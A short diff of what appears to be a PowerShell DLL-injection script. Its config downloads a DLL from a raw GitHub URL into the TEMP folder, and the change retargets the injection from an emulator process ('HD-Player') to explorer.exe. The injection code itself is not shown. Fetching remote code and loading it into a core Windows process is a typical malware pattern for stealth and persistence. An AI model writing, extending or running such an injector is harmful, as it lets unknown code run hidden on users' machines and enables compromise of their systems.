@@ -1,6 +1,6 @@
 # ================== CONFIG ===================== #
 $GitHubDLL_URL = "https://raw.githubusercontent.com/tasfik1974/textload-/main/textload.dll"
-$processName = "HD-Player"
+$processName = "explorer.exe"
 $LocalDLL_Path = "$env:TEMP\textload.dll"  # Better to use TEMP folder than System32
 # =============================================== #
 
@@ -171,3 +171,4 @@ catch {
 }
 
 Write-Host "✅ Script completed"
+
